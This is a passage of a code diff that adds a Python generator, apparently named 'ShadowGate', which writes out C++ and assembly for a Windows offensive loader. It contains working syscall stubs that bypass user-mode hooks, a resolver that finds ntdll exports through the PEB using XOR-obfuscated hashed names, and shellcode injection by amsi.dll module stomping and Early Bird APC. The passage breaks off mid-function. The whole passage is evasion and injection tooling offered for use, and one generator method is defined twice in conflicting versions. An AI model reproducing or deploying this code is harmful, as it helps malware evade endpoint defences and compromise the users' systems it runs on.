+NTSTATUS NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER Offset, PSIZE_T ViewSize, DWORD Inherit, ULONG AllocType, ULONG Protect) {
+    PrepareNextSyscall(IDX_NtMapViewOfSection);
+    return ((fn_NtMapViewOfSection)DoSyscall)(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, Offset, ViewSize, Inherit, AllocType, Protect);
+}
+
+NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
+    PrepareNextSyscall(IDX_NtUnmapViewOfSection);
+    return ((fn_NtUnmapViewOfSection)DoSyscall)(ProcessHandle, BaseAddress);
+}
+'''
+    
+    def _generate_direct_syscalls_asm(self) -> str:
+        """Generate direct syscall assembly (Hell's Gate style)"""
+        return '''; ============================================================================
+; ShadowGate - Direct Syscall Assembly (Hell's Gate Style)
+; ============================================================================
+
+.data
+    ; SSN storage
+    wSSN DWORD 0
+
+.code
+
+; ============================================================================
+; SetSSN - Store System Service Number
+; ============================================================================
+SetSSN PROC
+    xor eax, eax
+    mov wSSN, ecx
+    ret
+SetSSN ENDP
+
+; ============================================================================
+; DoSyscall - Execute Direct Syscall
+; RCX, RDX, R8, R9 = First 4 parameters
+; Additional parameters on stack
+; ============================================================================
+DoSyscall PROC
+    mov r10, rcx                ; First param to R10 (syscall convention)
+    mov eax, wSSN               ; SSN to EAX
+    syscall                     ; Direct syscall!
+    ret
+DoSyscall ENDP
+
+; ============================================================================
+; Individual Syscall Stubs
+; ============================================================================
+
+NtAllocateVirtualMemory_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtAllocateVirtualMemory_Stub ENDP
+
+NtProtectVirtualMemory_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtProtectVirtualMemory_Stub ENDP
+
+NtWriteVirtualMemory_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtWriteVirtualMemory_Stub ENDP
+
+NtReadVirtualMemory_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtReadVirtualMemory_Stub ENDP
+
+NtCreateThreadEx_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtCreateThreadEx_Stub ENDP
+
+NtOpenProcess_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtOpenProcess_Stub ENDP
+
+NtClose_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtClose_Stub ENDP
+
+NtQueueApcThread_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtQueueApcThread_Stub ENDP
+
+NtResumeThread_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtResumeThread_Stub ENDP
+
+NtWaitForSingleObject_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtWaitForSingleObject_Stub ENDP
+
+NtCreateSection_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtCreateSection_Stub ENDP
+
+NtMapViewOfSection_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtMapViewOfSection_Stub ENDP
+
+NtUnmapViewOfSection_Stub PROC
+    mov r10, rcx
+    mov eax, wSSN
+    syscall
+    ret
+NtUnmapViewOfSection_Stub ENDP
+
+END
+'''
+    
+    def _generate_indirect_syscalls_asm(self) -> str:
+        """Generate indirect syscall assembly (HookChain style)"""
+        return '''; ============================================================================
+; ShadowGate - Indirect Syscall Assembly (HookChain Style)
+; ============================================================================
+
+.data
+    wCurrentSSN     DWORD 0
+    qSyscallAddr    QWORD 0
+
+.code
+
+; ============================================================================
+; SetSSN - Set System Service Number
+; ============================================================================
+SetSSN PROC
+    mov wCurrentSSN, ecx
+    ret
+SetSSN ENDP
+
+; ============================================================================
+; PrepareSyscall - Prepare SSN and syscall address for next call
+; RCX = SSN
+; RDX = Address of syscall instruction in NTDLL
+; ============================================================================
+PrepareSyscall PROC
+    mov wCurrentSSN, ecx
+    mov qSyscallAddr, rdx
+    ret
+PrepareSyscall ENDP
+
+; ============================================================================
+; DoSyscall - Execute indirect syscall
+; Jumps to NTDLL's syscall instruction for legitimate stack trace
+; ============================================================================
+DoSyscall PROC
+    mov r10, rcx
+    mov eax, wCurrentSSN
+    jmp qword ptr [qSyscallAddr]
+DoSyscall ENDP
+
+END
+'''
+    
+    def _generate_direct_syscalls_asm(self) -> str:
+        """Generate direct syscall assembly (Hell's Gate style)"""
+        return '''; ============================================================================
+; ShadowGate - Direct Syscall Assembly (Hell's Gate Style)
+; ============================================================================
+
+.data
+    wCurrentSSN     DWORD 0
+    qSyscallAddr    QWORD 0
+
+.code
+
+; ============================================================================
+; SetSSN - Set System Service Number
+; ============================================================================
+SetSSN PROC
+    mov wCurrentSSN, ecx
+    ret
+SetSSN ENDP
+
+; ============================================================================
+; PrepareSyscall - Prepare SSN and syscall address
+; RCX = SSN
+; RDX = Address (not used in direct mode, but kept for compatibility)
+; ============================================================================
+PrepareSyscall PROC
+    mov wCurrentSSN, ecx
+    mov qSyscallAddr, rdx
+    ret
+PrepareSyscall ENDP
+
+; ============================================================================
+; DoSyscall - Execute direct syscall
+; ============================================================================
+DoSyscall PROC
+    mov r10, rcx
+    mov eax, wCurrentSSN
+    syscall
+    ret
+DoSyscall ENDP
+
+END
+'''
+    
+    def _generate_indirect_syscalls_cpp(self) -> str:
+        """Generate indirect syscalls C++ implementation"""
+        return '''/*
+ * ShadowGate - Indirect Syscall Implementation
+ */
+
+#include "syscalls.h"
+#include "resolver.h"
+
+// External assembly functions
+extern "C" void SetSyscallTable(PVOID pTable);
+extern "C" void PrepareSyscall(DWORD ssn, PVOID pSyscallAddr);
+
+// Global syscall table
+SYSCALL_ENTRY g_SyscallTable[MAX_SYSCALLS] = { 0 };
+DWORD g_SyscallCount = 0;
+
+BOOL InitializeSyscalls(VOID) {
+    if (!ResolveSyscalls(g_SyscallTable, &g_SyscallCount)) {
+        return FALSE;
+    }
+    
+    // Set table address for assembly
+    SetSyscallTable(g_SyscallTable);
+    
+    return TRUE;
+}
+
+DWORD GetSSN(DWORD dwIndex) {
+    if (dwIndex >= g_SyscallCount) return 0;
+    return g_SyscallTable[dwIndex].dwSSN;
+}
+
+PVOID GetSyscallAddress(DWORD dwIndex) {
+    if (dwIndex >= g_SyscallCount) return NULL;
+    return g_SyscallTable[dwIndex].pSyscallAddr;
+}
+
+// Call this before each syscall to set up SSN and address
+void PrepareNextSyscall(DWORD dwIndex) {
+    if (dwIndex < g_SyscallCount) {
+        PrepareSyscall(
+            g_SyscallTable[dwIndex].dwSSN,
+            g_SyscallTable[dwIndex].pSyscallAddr
+        );
+    }
+}
+'''
+    
+    def _generate_resolver_files(self) -> dict:
+        """Generate resolver files based on method"""
+        files = {}
+        files['resolver.h'] = self._generate_resolver_h()
+        files['resolver.cpp'] = self._generate_resolver_cpp()
+        return files
+    
+    def _generate_resolver_h(self) -> str:
+        """Generate resolver.h"""
+        return '''#ifndef _RESOLVER_H
+#define _RESOLVER_H
+
+#include <windows.h>
+#include "common.h"
+#include "syscalls.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// ============================================================================
+// Resolver Methods
+// ============================================================================
+
+#define RESOLVER_PEB        1
+#define RESOLVER_FRESH      2
+#define RESOLVER_HYBRID     3
+
+// ============================================================================
+// Functions
+// ============================================================================
+
+// Main resolver
+BOOL ResolveSyscalls(PSYSCALL_ENTRY pTable, PDWORD pCount);
+
+// NTDLL acquisition
+PVOID GetNtdllBase(VOID);
+PVOID GetNtdllFromPEB(VOID);
+PVOID GetFreshNtdll(VOID);
+
+// SSN extraction
+DWORD ExtractSSN(PVOID pFunctionAddress);
+PVOID FindSyscallInstruction(PVOID pFunctionAddress);
+
+// Halo's Gate (neighbor search)
+DWORD GetSSNFromNeighbor(PVOID pFunctionAddress);
+
+// Hash-based API resolution
+PVOID GetProcAddressByHash(PVOID pModuleBase, DWORD64 dwHash);
+DWORD64 HashString(LPCSTR str);
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _RESOLVER_H
+'''
+    
+    def _generate_resolver_cpp(self) -> str:
+        """Generate resolver.cpp - Dynamic hashing with obfuscated names"""
+        resolver_method = self.config.resolver
+    
+        # XOR key for name obfuscation
+        xor_key = 0x5A
+    
+        # Generate obfuscated syscall names
+        syscall_names = [
+            ("AllocateVirtualMemory",    "IDX_NtAllocateVirtualMemory"),
+            ("ProtectVirtualMemory",     "IDX_NtProtectVirtualMemory"),
+            ("WriteVirtualMemory",       "IDX_NtWriteVirtualMemory"),
+            ("ReadVirtualMemory",        "IDX_NtReadVirtualMemory"),
+            ("CreateThreadEx",           "IDX_NtCreateThreadEx"),
+            ("OpenProcess",              "IDX_NtOpenProcess"),
+            ("Close",                    "IDX_NtClose"),
+            ("QueryInformationProcess",  "IDX_NtQueryInformationProcess"),
+            ("QueryVirtualMemory",       "IDX_NtQueryVirtualMemory"),
+            ("FreeVirtualMemory",        "IDX_NtFreeVirtualMemory"),
+            ("ResumeThread",             "IDX_NtResumeThread"),
+            ("SuspendThread",            "IDX_NtSuspendThread"),
+            ("QueueApcThread",           "IDX_NtQueueApcThread"),
+            ("WaitForSingleObject",      "IDX_NtWaitForSingleObject"),
+            ("DelayExecution",           "IDX_NtDelayExecution"),
+            ("CreateSection",            "IDX_NtCreateSection"),
+            ("MapViewOfSection",         "IDX_NtMapViewOfSection"),
+            ("UnmapViewOfSection",       "IDX_NtUnmapViewOfSection"),
+            ("TerminateProcess",         "IDX_NtTerminateProcess"),
+        ]
+    
+        # Build encrypted name arrays
+        name_arrays = ""
+        for i, (name, idx) in enumerate(syscall_names):
+            encrypted = ', '.join(f'0x{ord(c) ^ xor_key:02X}' for c in name)
+            name_arrays += f"static unsigned char g_Name{i}[] = {{ {encrypted}, 0x00 }}; // {name}\n"
+    
+        # Build syscall table entries
+        table_entries = ""
+        for i, (name, idx) in enumerate(syscall_names):
+            table_entries += f"    {{ g_Name{i}, {len(name)}, {idx} }},\n"
+    
+        return f'''/*
+ * ShadowGate - Syscall Resolver
+ * Method: {resolver_method.upper()}
+ * Dynamic hashing with XOR-obfuscated names (no GetProcAddress)
+ */
+
+#include "resolver.h"
+#include "common.h"
+#include <stdio.h>
+
+// ============================================================================
+// Constants
+// ============================================================================
+
+#define MAX_NEIGHBOR_DISTANCE 32
+#define SYSCALL_STUB_SIZE 32
+#define DJB2_SEED 0x7734773477347734ULL
+#define NAME_XOR_KEY 0x{xor_key:02X}
+
+// ============================================================================
+// XOR-Encrypted Syscall Names
+// ============================================================================
+
+{name_arrays}
+
+// ============================================================================
+// Syscall Name Table
+// ============================================================================
+
+typedef struct _SYSCALL_NAME_ENTRY {{
+    const unsigned char* pEncName;
+    DWORD dwNameLen;
+    DWORD dwIndex;
+}} SYSCALL_NAME_ENTRY;
+
+static SYSCALL_NAME_ENTRY g_SyscallNames[] = {{
+{table_entries}}};
+
+#define SYSCALL_NAME_COUNT (sizeof(g_SyscallNames) / sizeof(g_SyscallNames[0]))
+
+// ============================================================================
+// Deobfuscate and Hash in One Pass
+// ============================================================================
+
+__forceinline DWORD64 DeobfuscateAndHash(const unsigned char* pEncName, DWORD dwLen) {{
+    DWORD64 hash = DJB2_SEED;
+    for (DWORD i = 0; i < dwLen; i++) {{
+        unsigned char c = pEncName[i] ^ NAME_XOR_KEY;
+        hash = ((hash << 5) + hash) + (DWORD64)c;
+    }}
+    return hash;
+}}
+
+// Standard hash function for export comparison
+DWORD64 HashString(LPCSTR str) {{
+    DWORD64 hash = DJB2_SEED;
+    while (*str) {{
+        hash = ((hash << 5) + hash) + (DWORD64)*str++;
+    }}
+    return hash;
+}}
+
+// ============================================================================
+// Get NTDLL Base from PEB (no API calls)
+// ============================================================================
+
+PVOID GetNtdllFromPEB(VOID) {{
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (!pPeb || !pPeb->Ldr) return NULL;
+    
+    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY pEntry = pHead->Flink->Flink; // Second entry = ntdll
+    
+    PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(
+        pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    
+    return pLdrEntry->DllBase;
+}}
+
+PVOID GetFreshNtdll(VOID) {{
+    return GetNtdllFromPEB();
+}}
+
+PVOID GetNtdllBase(VOID) {{
+    return GetNtdllFromPEB();
+}}
+
+// ============================================================================
+// Extract SSN from Syscall Stub
+// ============================================================================
+
+DWORD ExtractSSN(PVOID pFunc) {{
+    if (!pFunc) return 0;
+    PBYTE p = (PBYTE)pFunc;
+    
+    // Pattern: 4C 8B D1 B8 [SSN]
+    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {{
+        return *(PWORD)(p + 4);
+    }}
+    return 0;
+}}
+
+// ============================================================================
+// Find Syscall Instruction
+// ============================================================================
+
+PVOID FindSyscallInstruction(PVOID pFunc) {{
+    if (!pFunc) return NULL;
+    PBYTE p = (PBYTE)pFunc;
+    
+    for (DWORD i = 0; i < 32; i++) {{
+        if (p[i] == 0x0F && p[i + 1] == 0x05) {{
+            return &p[i];
+        }}
+    }}
+    return NULL;
+}}
+
+// ============================================================================
+// Halo's Gate - Get SSN from Neighbor
+// ============================================================================
+
+DWORD GetSSNFromNeighbor(PVOID pFunc) {{
+    PBYTE p = (PBYTE)pFunc;
+    
+    // Search UP
+    for (DWORD i = 1; i <= MAX_NEIGHBOR_DISTANCE; i++) {{
+        PBYTE pUp = p - (i * SYSCALL_STUB_SIZE);
+        if (pUp[0] == 0x4C && pUp[1] == 0x8B && pUp[2] == 0xD1 && pUp[3] == 0xB8) {{
+            return (*(PWORD)(pUp + 4)) + i;
+        }}
+    }}
+    
+    // Search DOWN
+    for (DWORD i = 1; i <= MAX_NEIGHBOR_DISTANCE; i++) {{
+        PBYTE pDown = p + (i * SYSCALL_STUB_SIZE);
+        if (pDown[0] == 0x4C && pDown[1] == 0x8B && pDown[2] == 0xD1 && pDown[3] == 0xB8) {{
+            return (*(PWORD)(pDown + 4)) - i;
+        }}
+    }}
+    
+    return 0;
+}}
+
+// ============================================================================
+// Find Export by Hash - Walks NTDLL Export Table
+// ============================================================================
+
+PVOID GetProcAddressByHash(PVOID pBase, DWORD64 dwTargetHash) {{
+    if (!pBase) return NULL;
+    
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pDos->e_lfanew);
+    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+    
+    DWORD dwExpRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!dwExpRVA) return NULL;
+    
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pBase + dwExpRVA);
+    PDWORD pNames = (PDWORD)((PBYTE)pBase + pExp->AddressOfNames);
+    PDWORD pFuncs = (PDWORD)((PBYTE)pBase + pExp->AddressOfFunctions);
+    PWORD pOrds = (PWORD)((PBYTE)pBase + pExp->AddressOfNameOrdinals);
+    
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {{
+        LPCSTR szName = (LPCSTR)((PBYTE)pBase + pNames[i]);
+        
+        // Only check Nt* and Zw* functions
+        if ((szName[0] == 'N' && szName[1] == 't') ||
+            (szName[0] == 'Z' && szName[1] == 'w')) {{
+            
+            // Hash WITHOUT the Nt/Zw prefix
+            DWORD64 h = HashString(szName + 2);
+            
+            if (h == dwTargetHash) {{
+                return (PVOID)((PBYTE)pBase + pFuncs[pOrds[i]]);
+            }}
+        }}
+    }}
+    
+    return NULL;
+}}
+
+// ============================================================================
+// Main Syscall Resolver
+// ============================================================================
+
+BOOL ResolveSyscalls(PSYSCALL_ENTRY pTable, PDWORD pCount) {{
+    PVOID pNtdll = GetNtdllBase();
+    
+#if DEBUG_BUILD
+    LOG_INFO("NTDLL @ 0x%p", pNtdll);
+#endif
+    
+    if (!pNtdll) {{
+#if DEBUG_BUILD
+        LOG_ERROR("Failed to get NTDLL base");
+#endif
+        return FALSE;
+    }}
+    
+    DWORD dwResolved = 0;
+    
+    for (DWORD i = 0; i < SYSCALL_NAME_COUNT; i++) {{
+        DWORD dwIndex = g_SyscallNames[i].dwIndex;
+        DWORD dwNameLen = g_SyscallNames[i].dwNameLen;
+        const unsigned char* pEncName = g_SyscallNames[i].pEncName;
+        
+        // Calculate hash from obfuscated name
+        DWORD64 dwHash = DeobfuscateAndHash(pEncName, dwNameLen);
+        
+        // Find function in export table
+        PVOID pFunc = GetProcAddressByHash(pNtdll, dwHash);
+        if (!pFunc) {{
+#if DEBUG_BUILD
+            char szName[64] = {{0}};
+            for (DWORD j = 0; j < dwNameLen && j < 63; j++) szName[j] = pEncName[j] ^ NAME_XOR_KEY;
+            LOG_ERROR("  [%2lu] Nt%s: NOT FOUND", dwIndex, szName);
+#endif
+            continue;
+        }}
+        
+        // Extract SSN
+        DWORD dwSSN = ExtractSSN(pFunc);
+        if (dwSSN == 0) {{
+            dwSSN = GetSSNFromNeighbor(pFunc);
+        }}
+        
+        if (dwSSN == 0) {{
+#if DEBUG_BUILD
+            char szName[64] = {{0}};
+            for (DWORD j = 0; j < dwNameLen && j < 63; j++) szName[j] = pEncName[j] ^ NAME_XOR_KEY;
+            LOG_ERROR("  [%2lu] Nt%s: SSN extraction failed", dwIndex, szName);
+#endif
+            continue;
+        }}
+        
+        // Find syscall instruction
+        PVOID pSyscall = FindSyscallInstruction(pFunc);
+        if (!pSyscall) {{
+#if DEBUG_BUILD
+            char szName[64] = {{0}};
+            for (DWORD j = 0; j < dwNameLen && j < 63; j++) szName[j] = pEncName[j] ^ NAME_XOR_KEY;
+            LOG_ERROR("  [%2lu] Nt%s: syscall not found", dwIndex, szName);
+#endif
+            continue;
+        }}
+        
+#if DEBUG_BUILD
+        char szName[64] = {{0}};
+        for (DWORD j = 0; j < dwNameLen && j < 63; j++) szName[j] = pEncName[j] ^ NAME_XOR_KEY;
+        LOG_INFO("  [%2lu] Nt%s: SSN=%u @ 0x%p", dwIndex, szName, dwSSN, pSyscall);
+#endif
+        
+        // Store in table
+        pTable[dwIndex].dwHash = dwHash;
+        pTable[dwIndex].pAddress = pFunc;
+        pTable[dwIndex].dwSSN = dwSSN;
+        pTable[dwIndex].pSyscallAddr = pSyscall;
+        pTable[dwIndex].bResolved = TRUE;
+        
+        dwResolved++;
+    }}
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("Resolved %lu/%lu syscalls", dwResolved, (DWORD)SYSCALL_NAME_COUNT);
+#endif
+    
+    *pCount = dwResolved;
+    return (dwResolved >= 10);
+}}
+'''
+    
+    def _generate_injection_files(self) -> dict:
+        """Generate injection files"""
+        files = {}
+        files['injection.h'] = self._generate_injection_h()
+        files['injection.cpp'] = self._generate_injection_cpp()
+        return files
+    
+    def _generate_injection_h(self) -> str:
+        """Generate injection.h"""
+        return '''#ifndef _INJECTION_H
+#define _INJECTION_H
+
+#include <windows.h>
+#include "common.h"
+#include "syscalls.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// ============================================================================
+// Injection Methods
+// ============================================================================
+
+#define INJECT_STOMP        1
+#define INJECT_EARLYBIRD    2
+#define INJECT_THREADPOOL   3
+#define INJECT_HOLLOWING    4
+#define INJECT_MAPPING      5
+
+// ============================================================================
+// Injection Context
+// ============================================================================
+
+typedef struct _INJECTION_CONTEXT {
+    PVOID       pShellcode;
+    SIZE_T      dwShellcodeSize;
+    LPCWSTR     wszTargetProcess;
+    DWORD       dwTargetPid;
+    DWORD       dwInjectionMethod;
+    HANDLE      hProcess;
+    HANDLE      hThread;
+    PVOID       pRemoteBase;
+    BOOL        bSuccess;
+} INJECTION_CONTEXT, *PINJECTION_CONTEXT;
+
+// ============================================================================
+// Functions
+// ============================================================================
+
+BOOL PerformInjection(PINJECTION_CONTEXT pCtx);
+
+// Individual injection methods
+BOOL InjectModuleStomp(PINJECTION_CONTEXT pCtx);
+BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx);
+BOOL InjectThreadPool(PINJECTION_CONTEXT pCtx);
+BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx);
+BOOL InjectMapping(PINJECTION_CONTEXT pCtx);
+
+// Helpers
+DWORD FindProcessByName(LPCWSTR wszProcessName);
+BOOL ExecuteViaCallback(PVOID pShellcode);
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _INJECTION_H
+'''
+
+    def _generate_injection_cpp(self) -> str:
+        """Generate injection.cpp with all 5 methods"""
+        return r'''/*
+ * ShadowGate - Injection Methods
+ * Includes: Stomp, EarlyBird, ThreadPool, Hollowing, Mapping
+ */
+
+#include "injection.h"
+#include "syscalls.h"
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// Forward declaration for indirect syscalls
+extern "C" void PrepareNextSyscall(DWORD dwIndex);
+
+// ============================================================================
+// Helper: Find Process by Name
+// ============================================================================
+
+DWORD FindProcessByName(LPCWSTR wszProcessName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+    
+    PROCESSENTRY32W pe32 = { 0 };
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    
+    DWORD dwPid = 0;
+    
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, wszProcessName) == 0) {
+                dwPid = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
+    }
+    
+    CloseHandle(hSnapshot);
+    return dwPid;
+}
+
+// ============================================================================
+// Helper: Execute via Callback (threadless)
+// ============================================================================
+
+BOOL ExecuteViaCallback(PVOID pShellcode) {
+    return EnumSystemLocalesA((LOCALE_ENUMPROCA)pShellcode, LCID_SUPPORTED);
+}
+
+// ============================================================================
+// Method 1: Module Stomping (Local)
+// ============================================================================
+
+BOOL InjectModuleStomp(PINJECTION_CONTEXT pCtx) {
+#if DEBUG_BUILD
+    LOG_INFO("Module Stomping: Loading sacrificial DLL...");
+#endif
+    
+    HMODULE hModule = LoadLibraryA("amsi.dll");
+    if (!hModule) {
+        hModule = LoadLibraryA("dbghelp.dll");
+    }
+    if (!hModule) {
+#if DEBUG_BUILD
+        LOG_ERROR("Failed to load sacrificial DLL");
+#endif
+        return FALSE;
+    }
+    
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+    
+    PVOID pTextSection = NULL;
+    DWORD dwTextSize = 0;
+    
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (strncmp((char*)pSection->Name, ".text", 5) == 0) {
+            pTextSection = (PVOID)((PBYTE)hModule + pSection->VirtualAddress);
+            dwTextSize = pSection->Misc.VirtualSize;
+            break;
+        }
+        pSection++;
+    }
+    
+    if (!pTextSection || pCtx->dwShellcodeSize > dwTextSize) {
+#if DEBUG_BUILD
+        LOG_ERROR("Text section not found or too small");
+#endif
+        return FALSE;
+    }
+    
+    PVOID pAddr = pTextSection;
+    SIZE_T regionSize = dwTextSize;
+    ULONG oldProtect = 0;
+    
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NTSTATUS status = NtProtectVirtualMemory((HANDLE)-1, &pAddr, &regionSize, PAGE_READWRITE, &oldProtect);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtProtectVirtualMemory failed: 0x%08X", status);
+#endif
+        return FALSE;
+    }
+    
+    memcpy(pTextSection, pCtx->pShellcode, pCtx->dwShellcodeSize);
+    
+    pAddr = pTextSection;
+    regionSize = dwTextSize;
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NtProtectVirtualMemory((HANDLE)-1, &pAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    ExecuteViaCallback(pTextSection);
+    
+    pCtx->bSuccess = TRUE;
+    return TRUE;
+}
+
+// ============================================================================
+// Method 2: Early Bird APC
+// ============================================================================
+
+BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx) {
+    WCHAR wszPath[MAX_PATH] = { 0 };
+    GetSystemDirectoryW(wszPath, MAX_PATH);
+    lstrcatW(wszPath, L"\\");
+    lstrcatW(wszPath, pCtx->wszTargetProcess);
+    
+#if DEBUG_BUILD
+    LOG_INFO("Early Bird: Target path: %ws", wszPath);
+#endif
+    
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = { 0 };
+    
+    if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE,
+                       CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                       NULL, NULL, &si, &pi)) {
+#if DEBUG_BUILD
+        LOG_ERROR("CreateProcessW failed: %lu", GetLastError());
+#endif
+        return FALSE;
+    }
+    
+#if DEBUG_BUILD
+    LOG_INFO("Early Bird: PID=%lu, TID=%lu", pi.dwProcessId, pi.dwThreadId);
+#endif
+    
+    PVOID pRemoteBase = NULL;
+    SIZE_T regionSize = pCtx->dwShellcodeSize + 0x1000;
+    
+    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
+    NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &pRemoteBase, 0, &regionSize,
+                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtAllocateVirtualMemory failed: 0x%08X", status);
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+#if DEBUG_BUILD
+    LOG_INFO("Early Bird: Allocated @ 0x%p", pRemoteBase);
+#endif
+    
+    SIZE_T bytesWritten = 0;
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    status = NtWriteVirtualMemory(pi.hProcess, pRemoteBase, pCtx->pShellcode,
+                                   pCtx->dwShellcodeSize, &bytesWritten);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtWriteVirtualMemory failed: 0x%08X", status);
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+    PVOID pAddr = pRemoteBase;
+    regionSize = pCtx->dwShellcodeSize + 0x1000;
+    ULONG oldProtect = 0;
+    
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    NtProtectVirtualMemory(pi.hProcess, &pAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    PrepareNextSyscall(IDX_NtQueueApcThread);
+    status = NtQueueApcThread(pi.hThread, pRemoteBase, NULL, NULL, NULL);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtQueueApcThread failed: 0x%08X", status);
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+#if DEBUG_BUILD
+    LOG_INFO("Early Bird: APC queued, resuming...");
+#endif
+    
+    PrepareNextSyscall(IDX_NtResumeThread);
+    ULONG suspendCount = 0;
+    status = NtResumeThread(pi.hThread, &suspendCount);
+    
+    if (!NT_SUCCESS(status)) {
+#if DEBUG_BUILD
+        LOG_ERROR("NtResumeThread failed: 0x%08X", status);
+#endif
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return FALSE;
+    }
+    
+    pCtx->hProcess = pi.hProcess;
+    pCtx->hThread = pi.hThread;
+    pCtx->pRemoteBase = pRemoteBase;
+    pCtx->bSuccess = TRUE;
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("Early Bird: Injection complete!");
+#endif
+    
+    return TRUE;
+}
+
+// ============================================================================
+// Method 3: Thread Pool (Remote Thread)
+// ============================================================================
+
+BOOL InjectThreadPool(PINJECTION_CONTEXT pCtx) {
+    DWORD dwPid = pCtx->dwTargetPid;
+    
+    if (dwPid == 0) {
+        dwPid = FindProcessByName(pCtx->wszTargetProcess);
+    }
+    
+    if (dwPid == 0) {
+        WCHAR wszPath[MAX_PATH] = { 0 };
+        GetSystemDirectoryW(wszPath, MAX_PATH);
+        lstrcatW(wszPath, L"\\");
+        lstrcatW(wszPath, pCtx->wszTargetProcess);
+        
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        
+        if (!CreateProcessW(wszPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+#if DEBUG_BUILD
+            LOG_ERROR("Failed to start target process");
+#endif
+            return FALSE;
+        }
+        
+        Sleep(1000);
+        dwPid = pi.dwProcessId;
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    
+#if DEBUG_BUILD
